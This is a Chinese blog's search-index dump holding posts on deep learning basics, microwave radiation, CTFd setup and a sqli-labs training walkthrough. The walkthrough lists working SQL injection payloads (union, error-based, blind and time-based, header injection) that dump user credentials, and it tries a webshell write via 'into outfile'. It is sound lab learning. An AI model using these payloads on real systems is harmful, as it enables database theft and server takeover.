过拟合 只能拟合训练数据，但不能很好地拟合不包含在训练数据中的其他数据的状态 原因 模型拥有大量参数，表现力强 训练数据少 权值衰减 通过在学习的过程中对大的权重进行惩罚，来抑制过拟合 例：为损失函数加上权重的平方范数（1/2λW^2） Dropout Dropout是一种在学习的过程中随机删除神经元的方法。训练时，随机选出隐藏层的神经元，然后将其删除。被删除的神经元不再进行信号的传递","categories":[],"tags":[{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"微波炉究竟有没有辐射","slug":"microwave_oven","date":"2021-11-30T15:24:20.874Z","updated":"2021-12-06T15:39:31.281Z","comments":true,"path":"2021/11/30/microwave_oven/","link":"","permalink":"http://uniqueland.top/2021/11/30/microwave_oven/","excerpt":"震惊！这个常见的家用电器竟有这么大的辐射","text":"震惊！这个常见的家用电器竟有这么大的辐射 直奔主题，微波炉对人体究竟会不会产生危害要知道微波炉是否会对人体产生危害，就得先知道什么程度的微波会对人体产生危害 可以看出，只要50mm以外泄露的微波小于等于50W/m^2，就不会对人体造成影响，而市面上的绝大多数微波炉也都满足这一标准，即使在使用了一段时间后，虽然门把手及炉门密封处微波泄漏量略有上升，但也都在标准以内 顺便说一声，微波炉的产生的辐射属于非电离辐射，并不能破坏分子结构和产生电离作用；频率在2.45GHz左右，也就WIFI的频率，而且微波炉是在金属容器中工作的，这些金属容器能够很好地限制微波 所以，微波炉不会对人体造成伤害 问题解答微波炉泄漏的辐射会致畸？ 点击查看答案 同样是2.45GHz左右的频率，既然WIFI没有致畸作用，想必微波炉也不具备这样的能力 微波炉加热食物会产生致癌物质？ 点击查看答案 想知道是否致癌，得从微波炉加热的本质说起微波炉加热的其实是食物中的水。当微波辐射到食品上时，水的极性分子的取向将随微波场而变动。由于食品中水的极性分子的这种运动，以及相邻分子间的相互作用，产生了焦耳热，从而加热食物，所以微波炉加热不会产生致癌物质 微波炉门的那块可视窗口部分有洞，会不会产生辐射呢？ 点击查看答案 来人，上公式可以看出微波的波长大概在12cm左右，比微波炉门上的小洞直径大得多，微波根本出不来 微波炉加热的食品，会不会改变食品本身的营养成分？ 点击查看答案 我们要明白的是：任何形式的烹饪都会破坏食物中的营养成分，但关键的变量是烹饪中所用水的多少，烹饪的时间，以及温度。正常的微波烹饪由于时间短，避免了传统烹饪中食物表面温度过高的弊端，油烟更少，所以产生的致癌物也更少。而且，在烹饪方法中，微波炉加热对食品营养成分的保护是属于比较好的，“能最大限度地保留食品的营养及原有的色香味”。 资料参考： 求真测试：微波炉辐射大？比手机大多了|食品|微波炉|微波_新浪科技_新浪网 (sina.com.cn) 老爸评测：让我们谈谈关于微波炉的辐射问题_微波炉_什么值得买 (smzdm.com) 部分图源必应，侵删","categories":[],"tags":[{"name":"other","slug":"other","permalink":"http://uniqueland.top/tags/other/"}]},{"title":"sqli-labs","slug":"sqli-labs","date":"2021-11-30T05:33:41.039Z","updated":"2022-01-02T03:04:14.353Z","comments":true,"path":"2021/11/30/sqli-labs/","link":"","permalink":"http://uniqueland.top/2021/11/30/sqli-labs/","excerpt":"用校园网可能不能成功发送payload，切记！！！","text":"用校园网可能不能成功发送payload，切记！！！ Less-01 先判断是字符型注入还是数字型注入 payload：http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=1 and 1=2–+ 再判断注入点 payload：http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,2,3–+ 查看数据库名称 payload：http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,database(),3–+ 查看库中的表 payload：http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=”security”–+ 查看用户表中字段 payload：http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=”users”–+ 查看用户名和密码 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,group_concat(username,password),3 from security.users–+ 换个方式显示 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,group_concat(username),group_concat(password) from security.users–+ Less-02 判断是数字型注入还是字符型注入 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=3-1 判断注入点 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,2,3--+ 往下操作与第一题类似，payload就差了一个单引号 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+ Less-03 判断为字符型注入还是数字型注入 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=2-1 该题为字符型注入，但直接使用联合注入报错 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27%20union%20select%201,2,3--+ 根据题目提示，在id表示的数据及引号后加上括号，再进行联合注入，注入成功 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,2,3--+ 往下与第一题相同，union后的payload一致 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+ Less-04 判断为字符型注入还是数字型注入 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=2-1 使用单引号进行闭合，报错 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%27%20union%20select%201,2,3--+ 组合单引号、双引号以及括号得到注入点 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1&quot;) union select 1,2,3–+ 往下步骤与上述题目相同 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%22)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+ Less-05 判断为字符型注入还是数字型注入 回显报错数据，尝试盲注 payload：http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27%20and%20select%201,2,3--+ 对查询结果进行切片，再与各个字符比较，根据报错与否判断比较结果 payload：http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+ 改变上一个payload中c的值以遍历出数据库名称，再结合前面题目的payload逐步爆出表名和列名 payload：http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%22security%22),1,1)=%27e%27--+ 列名以此类推 可以用python写个脚本来跑，或者使用burpsuite 另外，还可以使用updataxml()函数来获取相关信息 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(SELECT%20@@datadir),0x7e),1)--+ Less-06与上一道题类似，将单引号换为双引号 Less-07 利用永真永假的条件配合and和or判断参数id的闭合方式 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1%27))%20and%201=1--+ 利用select xxx into outfile xxx/xxx的方式向服务器中写入文件，文件内容为一句话木马 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1&#39;)) union select 1,’2’,”“ into outfile “./“ –+ 由于不知道网站的根目录，所以目前无法对传入文件的成功与否做出判断 Less-08 判断参数闭合方式 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27%20or%201=1%20--+ 由于注入错误时不回显，因此可以使用上述的盲注 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+ 往后步骤与上述盲注步骤一致 Less-09 在判断参数闭合方式时，发现回显不改变 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%201=2--+ 尝试基于时间的盲注 可以看到网页根据设定的时间正在加载，说明注入成功 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if(1,sleep(3),1)--+ 接下来只需要将sleep函数的第一个参数替换为payload，即可根据网页响应时间判断结果 payload取上述盲注payload的查询部分 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if((substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27),sleep(3),1)--+ Less-10 将闭合参数的单引号替换为双引号，其余一致 Less-11这道题是使用post方式提交数据的，在多次尝试以及上网找资料之后，发现有两点需要注意 不可以直接将url编码之后的数据（如%20）直接提交 最后的注释不可以用“–+”，而应该用“#” 上面这样注释是行不通的，用“#”代替“–+”之后如下图 然后再用之前写过的题当中出现的联合注入 Less-12原理同上一题一致，唯一差别是闭合方式不同 less-13这道题的闭合方式与上一道题目比较相似，只不过把双引号替换为单引号，比较不一样的是这道题不可以使用上一道题的联合注入，可以使用报错注入，具体的payload可参照上述题目有关报错注入的部分 下图是联合注入后无回显的结果 这里使用了报错注入返回了mysql的绝对路径 payload：1’) and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)# 这里查询到了当前的数据库 需要注意的是由于返回长度的限制，回显无法显示所有的结果，可以根据payload作相应调整 payload：1’) and updatexml(1,concat(0x7e,(select group_concat(username,password) from security.users),0x7e),1)# Less-14这道题与上一道题类似，唯一不同的仍是闭合方式不同 Less-15这道题考察的是post方式的基于时间的盲注 一开始依然先判断闭合方式 然后用if语句构造基于时间的盲注 这里无需关注是否登录成功，只需关注响应时间 然后根据上述题目中有关基于时间的盲注有关的题目的payload进行注入 payload：1’ or if((substr((select group_concat(schema_name) from information_schema.schemata),1,1)=’c’),sleep(2),1) # Less-16这道题与上一道题目差不多，唯一区别仍是闭合方式不同 Less-17这道题涉及到了sql语句中update部分，模拟的是在登录成功后修改密码时的注入 这里由于无法回显闭合方式是否正确，故使用基于时间的盲注中的小技巧进行判断 往下的过程涉及到子查询的概念，即以查询的结果作为下一次查询的范围 查数据库 往后只需将select database()替换为先前题目中相应的payload即可 Less-18一开始给出了本机的ip地址，意义不明（估计是提示可以注入某些类型的信息以执行） 再经过对username和password的多次注入后发现没有什么效果，尝试登录 可以看出登录后回显了user agent，则可以通过抓包修改user agent的方式注入 payload：’and updatexml(1,concat(0x7e,database(),0x7e),1) or ‘ Less-19这道题与上一道差不多，只不过修改的是Referer字段 payload：与上一道题一致","categories":[],"tags":[{"name":"ctf、web","slug":"ctf、web","permalink":"http://uniqueland.top/tags/ctf%E3%80%81web/"}]},{"title":"Deep Learning from Scratch 2","slug":"deep_learning_from_scratch_2","date":"2021-11-29T14:46:25.122Z","updated":"2021-12-05T02:56:57.166Z","comments":true,"path":"2021/11/29/deep_learning_from_scratch_2/","link":"","permalink":"http://uniqueland.top/2021/11/29/deep_learning_from_scratch_2/","excerpt":"在”手写数字识别”中","text":"在”手写数字识别”中 了解到了mnist数据集 对运算过程中运算的具体对象有点问题 1234567891011import sys, ossys.path.append(os.pardir)from dataset.mnist import load_mnist(x_train, t_train), (x_test, t_test) = load_mnist(flatten=True, normalize=False) #一开始不知道这是什么意思print(x_train.shape)print(t_train.shape)print(x_test.shape)print(t_test.shape) 对于代码中出现的两个元组，一开始不知道 t_train t_test 代表什么，在纠结了一段时间后终于明白了 x_train 是训练用的图像数据 t_train 是训练图像的解，即每个图像对应的数字 x_test 是用于测试的图像数据 t_test 是测试图像的解，即每个图像对应的数字 认识了正规化、预处理和 one-hot 表示法 正规化指的是将数据进行转化，如对图像的每个像素数值除以256，使其数值在0到1之间，方便后续运算 预处理，顾名思义，就是在运算之前对数据进行转换，如正规化等 one-hot 表示法是指对运算结果只将 解 所对应的值设为1，即将 解 作为索引，设置该索引的值为1；在对图像进行预测的脚本中，获取解的过程便是基于one-hot表示法的，如下 p= np.argmax(y) 12345for i in range(len(x)): y = predict(network, x[i]) p= np.argmax(y) # 获取概率最高的元素的索引 if p == t[i]: accuracy_cnt += 1 另外，在阅读到设计神经网络时，学到了有关输入层和输出层与数据之间的关系 输入层为待训练数据的大小，如训练手写数字识别时输入层为784，即为训练图像的大小 输出层为分类数目，如训练的手写数字结果只有0到9十种可能，故将输出层设为十 在“从数据中学习”中 认识了许多概念 特征量 特征量是指可以从输入数据中准确地提取本质数据的转换器，通常表示为向量形式 特征量是由人设计的 不同问题对应不同特征量 深度学习中特征量是由机器来学习的 泛化能力 泛化能力是指处理未被观察过的数据（不包含在训练数据中的数据）的能力 过拟合 只对某个数据集过度拟合的状态称为过拟合 可以理解为训练的模型只对某个数据集起作用 损失函数 损失函数是表示神经网络性能的“恶劣程度”的指标，即当前的神经网络对监督数据在多大程度上不拟合，在多大程度上不一致 均方误差$$E=\\frac{1}{2}\\Sigma_k(y_k-t_k)^2$$ 这里y_k表示神经网络的输出，t_k表示监督数据，k表示数据维数 交叉熵误差$$E=-\\Sigma_kt_k\\log{y_k}$$ 损失函数的意义个人认为，损失函数存在的意义是作为模型调参结果的重要指标，由于测试精度的变化是不连续的（因为测试数据有限，测试结果的精度就取决于测试数据的多少），故无法体现模型调参后微小的变化，而损失函数是连续的，任何微小的改动都可能改变损失函数的结果（可以认为损失函数的精度比测试结果的精度高得多），故需要损失函数来衡量调参后的结果 数值微分 利用某个给定的微小值的差分求导数的过程，称为数值微分 导数与偏导数的定义 梯度及梯度法 梯度法：函数的取值从当前位置沿着梯度方向前进一段距离，然后在新的地方重新求梯度，再沿着新梯度方向前进，逐渐减小函数值 学习算法（随机梯度下降法）的实现神经网络的学习步骤： 前提 神经网络存在合适的权重和偏置，调整权重和偏置以便拟合训练数据的过程称为“学习” 步骤1（mini-batch） 从训练数据中随机选出一部分数据，这部分数据称为mini-batch。我们的目标是减小mini-batch的损失函数的值 步骤2（计算梯度） 为了减小mini-batch的损失函数的值，需要求出各个权重参数的梯度。梯度表示损失函数的值减小最多的方向 步骤3（更新参数） 将权重参数沿梯度方向进行微小更新 步骤4（重复） 重复步骤1、步骤2、步骤3 epoch： epoch是一个单位，一个epoch表示学习中所有训练数据均被使用过一次时的更新次数 误差方向传播法计算图了解正向传播、反向传播及局部计算的定义 链式法则复合函数导数的定义 如果某个函数由复合函数表示，则该复合函数的导数可以用构成复合函数的各个函数的导数的乘积表示 链式法则是关于复合函数的导数的性质 反向传播反向传播的计算顺序 先将节点的输入信号乘以节点的局部导数（偏导数），然后传递给下一个节点 加法节点的反向传播 加法节点的反向传播只乘以1 乘法节点的反向传播 乘法节点的反向传播会将上游的值乘以正向传播时的输入信号的“翻转值”后传递给下游 对翻转值的理解：书上说的是“表示一种翻转关系”，个人认为是参与运算的另一个值，以乘法为例：乘法涉及到两个值，则传播到某一个方向的值为上游的值乘以参与运算的另一个对象的值","categories":[],"tags":[{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"CTFd搭建","slug":"ctf_contest_platform_build","date":"2021-11-28T09:32:15.439Z","updated":"2021-11-28T09:35:07.152Z","comments":true,"path":"2021/11/28/ctf_contest_platform_build/","link":"","permalink":"http://uniqueland.top/2021/11/28/ctf_contest_platform_build/","excerpt":"CTF比赛平台搭建","text":"CTF比赛平台搭建 克隆CTFdGitHub：https://github.com/CTFd/CTFd 123456789┌──(kali㉿kali)-[/var/www/html]└─$ sudo git clone https://github.com/CTFd/CTFd.git 128 ⨯Cloning into &#x27;CTFd&#x27;...remote: Enumerating objects: 14012, done.remote: Counting objects: 100% (869/869), done.remote: Compressing objects: 100% (555/555), done.remote: Total 14012 (delta 480), reused 578 (delta 291), pack-reused 13143Receiving objects: 100% (14012/14012), 25.84 MiB | 1.69 MiB/s, done.Resolving deltas: 100% (8691/8691), done. 安装docker12┌──(kali㉿kali)-[/var/www/html/CTFd]└─$ sudo apt install docker docker-compose 1234567┌──(kali㉿kali)-[/var/www/html/CTFd]└─$ docker --versionDocker version 20.10.8+dfsg1, build 3967b7d ┌──(kali㉿kali)-[/var/www/html/CTFd]└─$ docker-compose --versiondocker-compose version 1.27.4, build unknown 添加执行权限12┌──(kali㉿kali)-[/var/www/html/CTFd]└─$ sudo chmod +x /usr/bin/docker-compose 在CTFd根目录下启动docker123456789101112131415161718192021┌──(kali㉿kali)-[/var/www/html/CTFd]└─$ sudo docker-compose up -d 130 ⨯Creating network &quot;ctfd_internal&quot; with the default driverCreating network &quot;ctfd_default&quot; with the default driverPulling db (mariadb:10.4.12)...10.4.12: Pulling from library/mariadb23884877105a: Pull completebc38caa0f5b9: Pull complete2910811b6c42: Pull complete36505266dcc6: Pull completee69dcc78e96e: Pull complete222f44c5392d: Pull completeefc64ea97b9c: Pull complete9912a149de6b: Pull complete7ef6cf5b5697: Pull complete8a05be3688e0: Pull completec09ffdc1b660: Pull complete2eb7fe288fc8: Pull completeb41d1cc4d40f: Pull completea92376500910: Pull complete...... 注：首次启动由于下载依赖等会比较慢 平台配置打开浏览器，输入127.0.0.1:8000配置赛事相关信息 添加题目在GitHub上找题目，clone到本地 1234567┌──(kali㉿kali)-[/var/www/html/CTFd/ctf_training]└─$ sudo git clone https://github.com/CTFTraining/CTFTraining.gitCloning into &#x27;CTFTraining&#x27;...remote: Enumerating objects: 86, done.remote: Total 86 (delta 0), reused 0 (delta 0), pack-reused 86Receiving objects: 100% (86/86), 31.72 KiB | 331.00 KiB/s, done.Resolving deltas: 100% (48/48), done. 实际测试发现不能把所有的题目都clone下来，就先试一道题 1234567┌──(kali㉿kali)-[/var/www/html/CTFd/ctf_training]└─$ sudo git clone https://github.com/CTFTraining/0ctf_2016_unserialize.git 128 ⨯Cloning into &#x27;0ctf_2016_unserialize&#x27;...remote: Enumerating objects: 32, done.remote: Total 32 (delta 0), reused 0 (delta 0), pack-reused 32Receiving objects: 100% (32/32), 779.15 KiB | 2.07 MiB/s, done.Resolving deltas: 100% (3/3), done. docker images 命令查看已有镜像 docker build ./ -t [镜像名称] 启动Dockerfile文件，创建镜像 12345678910111213141516┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]└─$ sudo docker build ./ -t 0ctf_2016_unserialize Sending build context to Docker daemon 1.841MBStep 1/8 : FROM php:5.6-fpm-alpine5.6-fpm-alpine: Pulling from library/php169185f82c45: Pull complete 8ba0d98519aa: Pull complete 75f762bbc102: Pull complete 04f939cd9fe5: Pull complete 5feedbe48aa1: Pull complete 47e0f87348c0: Pull complete 68b7fb9d3c14: Pull complete 7e4b086d6b5d: Pull complete a15e624700d4: Pull complete f714654cc532: Pull complete Digest: sha256:e3845c650c700234be3fb5b94865753d1a4534f8820d4dea1d0ee6d875efe02b 123456789101112┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]└─$ sudo docker images 1 ⨯REPOSITORY TAG IMAGE ID CREATED SIZE0ctf_2016_unserialize latest 931233916db0 2 minutes ago 333MBctfd_ctfd latest b36ee26f2439 49 minutes ago 791MBpython 3.7-slim-buster cd7d26aa86ac 10 days ago 113MBnginx 1.17 9beeba249f3e 18 months ago 127MBmariadb 10.4.12 b6184b68d1fd 19 months ago 357MBredis 4 191c4017dcdd 19 months ago 89.3MBubuntu 18.10 9dc19675e327 2 years ago 67.3MBphp 5.6-fpm-alpine 6feac8f2ef42 2 years ago 54.5MBphp 5-apache-jessie d34f09f63596 2 years ago 374MB 再通过镜像创建容器： 12┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]└─$ sudo docker run --name 0ctf_2016_unserialize -p 20000:80 -d 0ctf_2016_unserialize 查看现有容器： 12345678┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]└─$ sudo docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES9cae78cf79bc 0ctf_2016_unserialize &quot;docker-php-entrypoi…&quot; 5 seconds ago Up 4 seconds 9000/tcp, 0.0.0.0:20000-&gt;80/tcp, :::20000-&gt;80/tcp 0ctf_2016_unserialize3b3889db12c7 nginx:1.17 &quot;nginx -g &#x27;daemon of…&quot; 57 minutes ago Up 57 minutes 0.0.0.0:80-&gt;80/tcp, :::80-&gt;80/tcp ctfd_nginx_17b58b9661715 ctfd_ctfd &quot;/opt/CTFd/docker-en…&quot; 57 minutes ago Up 57 minutes 0.0.0.0:8000-&gt;8000/tcp, :::8000-&gt;8000/tcp ctfd_ctfd_193e49564bff7 mariadb:10.4.12 &quot;docker-entrypoint.s…&quot; 57 minutes ago Up 57 minutes ctfd_db_19f4380eb4639 redis:4 &quot;docker-entrypoint.s…&quot; 57 minutes ago Up 57 minutes 访问127.0.0.1:20000即可访问到刚刚添加的题目，20000是刚刚指定的端口 打开题目容器： 1docker exec -i -t &lt;container&gt; /bin/sh 为题目添加flag： 1234567┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]└─$ sudo docker exec -i -t 0ctf_2016_unserialize /bin/sh 1 ⨯/var/www/html # lsclass.php config.php index.php profile.php register.php static update.php upload www.zip/var/www/html # echo flag&#123;an_e@sy_un5eri@li2e_chall3nge&#125; &gt; flag.txt/var/www/html # lsclass.php config.php flag.txt index.php profile.php register.php static update.php upload www.zip 最后在后台添加题目地址等信息 同理可添加其他题目 搭建中遇到的问题 git clone 命令克隆失败： 1234┌──(kali㉿kali)-[/var/www/html/CTFd/ctf_training]└─$ sudo git clone https://github.com/CTFTraining/0ctf_2016_unserialize.git 128 ⨯Cloning into &#x27;0ctf_2016_unserialize&#x27;...fatal: unable to access &#x27;https://github.com/CTFTraining/0ctf_2016_unserialize.git/&#x27;: Failed to connect to github.com port 443: Connection refused 由于网络问题，可能需要多克隆几次，实在不行可以试试把压缩包下载下来 有些题目克隆下来可能有问题，运行过程中可能会报错（目前仍不了解是什么原因） 1234567891011121314151617181920212223242526272829303132┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/34c3ctf_2017_urlstorage]└─$ sudo docker build ./ -t urlstorage 1 ⨯Sending build context to Docker daemon 282.6kBStep 1/7 : FROM ubuntu:18.1018.10: Pulling from library/ubuntu8a532469799e: Pull complete 32f4dcec3531: Pull complete 230f0701585e: Pull complete e01f70622967: Pull complete Digest: sha256:7d657275047118bb77b052c4c0ae43e8a289ca2879ebfa78a703c93aa8fd686cStatus: Downloaded newer image for ubuntu:18.10 ---&gt; 9dc19675e327Step 2/7 : ENV DOCKER=1 PHANTOMJS_VERSION=&quot;2.1.1&quot; ---&gt; Running in 98e854ac92f3Removing intermediate container 98e854ac92f3 ---&gt; 154a521cb653Step 3/7 : RUN sed -i &#x27;s/http:\\/\\/archive.ubuntu.com\\//http:\\/\\/mirrors.tuna.tsinghua.edu.cn\\//g&#x27; /etc/apt/sources.list &amp;&amp; sed -i &#x27;/security/d&#x27; /etc/apt/sources.list &amp;&amp; apt-get -y update &amp;&amp; apt-get -yqq install curl python3 python3-pip mariadb-server libmysqlclient-dev nginx wget bzip2 libfreetype6 libfontconfig &amp;&amp; mkdir -p /srv/var &amp;&amp; wget --local-encoding=UTF-8 --no-check-certificate -O /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp; tar -xjf /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 -C /tmp &amp;&amp; rm -f /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp; mv /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64/ /srv/var/phantomjs &amp;&amp; ln -s /srv/var/phantomjs/bin/phantomjs /usr/bin/phantomjs &amp;&amp; pip3 install django gunicorn mysqlclient requests lxml pyyaml django-simple-captcha ---&gt; Running in 8d702a730242Ign:1 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic InReleaseIgn:2 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates InReleaseIgn:3 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports InReleaseErr:4 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic Release 404 Not Found [IP: 101.6.15.130 80]Err:5 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates Release 404 Not Found [IP: 101.6.15.130 80]Err:6 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports Release 404 Not Found [IP: 101.6.15.130 80]Reading package lists...E: The repository &#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic Release&#x27; does not have a Release file.E: The repository &#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates Release&#x27; does not have a Release file. E: The repository &#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports Release&#x27; does not have a Release file. The command &#x27;/bin/sh -c sed -i &#x27;s/http:\\/\\/archive.ubuntu.com\\//http:\\/\\/mirrors.tuna.tsinghua.edu.cn\\//g&#x27; /etc/apt/sources.list &amp;&amp; sed -i &#x27;/security/d&#x27; /etc/apt/sources.list &amp;&amp; apt-get -y update &amp;&amp; apt-get -yqq install curl python3 python3-pip mariadb-server libmysqlclient-dev nginx wget bzip2 libfreetype6 libfontconfig &amp;&amp; mkdir -p /srv/var &amp;&amp; wget --local-encoding=UTF-8 --no-check-certificate -O /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp; tar -xjf /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 -C /tmp &amp;&amp; rm -f /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp; mv /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64/ /srv/var/phantomjs &amp;&amp; ln -s /srv/var/phantomjs/bin/phantomjs /usr/bin/phantomjs &amp;&amp; pip3 install django gunicorn mysqlclient requests lxml pyyaml django-simple-captcha&#x27; returned a non-zero code: 100 许多命令都需要root权限，如果在哪一步运行报错了可以检查以下是否是权限问题","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://uniqueland.top/tags/ctf/"}]},{"title":"Deep Learning from Scratch","slug":"deep_learning_from_scratch","date":"2021-11-28T07:05:56.160Z","updated":"2021-11-30T14:51:29.989Z","comments":true,"path":"2021/11/28/deep_learning_from_scratch/","link":"","permalink":"http://uniqueland.top/2021/11/28/deep_learning_from_scratch/","excerpt":"读书记录","text":"读书记录 收获： 对matplotlib、numpy有了初步认识 了解了一些基础概念 跟随书本实现了简单的逻辑门电路 认识了感知机、激活函数 numpy:123456import numpy as npx = np.array([1.0,2.0,3.0]) #生成数组print(x)print(x.dtype) #查看数据类型print(x.shape) #查看矩阵形状x = x.flatten() #将矩阵转换为一维数组 matplotlib12345678910import matplotlib.pyplot as pltfrom matplotlib.image import imreadx = [1, 2, 3, 4, 5]y = [2, 4, 6, 8, 10]plt.plot(x, y) #绘制图形plt.show() #显示坐标系img = imread(&quot;lena.png&quot;)plt.imshow(img) #显示图像 基础概念 广播：将与矩阵相乘的标量转换为相应大小矩阵的功能 张量：一般化之后的向量或矩阵 感知机：感知机(perceptron)是二类分类的线性分类模型，其输入为实例的特征向量，输出为实例的类别。 简单逻辑门的实现12345678910111213141516171819202122232425262728293031323334353637import numpy as npdef AND(x1, x2): x = np.array([x1, x2]) w = np.array([0.5 0.5]) b = -0.7 tmp = np.sum(w*x) + b if tmp &lt;= 0: return 0 elif tmp &gt; 0: return 1def NAND(x1, x2): x = np.array([x1, x2]) w = np.array([-0.5 -0.5]) b = 0.7 tmp = np.sum(w*x) + b if tmp &lt;= 0: return 0 elif tmp &gt; 0: return 1def OR(x1, x2): x = np.array([x1, x2]) w = np.array([0.5 0.5]) b = -0.2 tmp = np.sum(w*x) + b if tmp &lt;= 0: return 0 elif tmp &gt; 0: return 1def XOR(x1, x2): s1 = NAND(x1, x2) s2 = OR(x1, x2) y = AND(s1, s2) return y 感知机感知机的局限性​ 单层感知机只能表示线性空间 多层感知机的优势 多层感知机可以实现非线性空间 使用了非线性函数sigmoid作为激活函数的2层感知机可以表示任意函数 激活函数定义：将输入信号的总和转换为输出信号的函数 sigmoid函数：$$h(x) = \\frac{1}{(1+e^{-x})}$$ 阶跃函数： 12345def step_function(x): if x &gt; 0: return 1 else: return 0 或者 123def step_function(x): y = x &gt; 0 return y.astype(np.int) ReLU函数$$h(x)=\\begin{cases}x (x&gt;0)\\0 (x\\leq0)\\\\end{cases}$$ 恒等函数 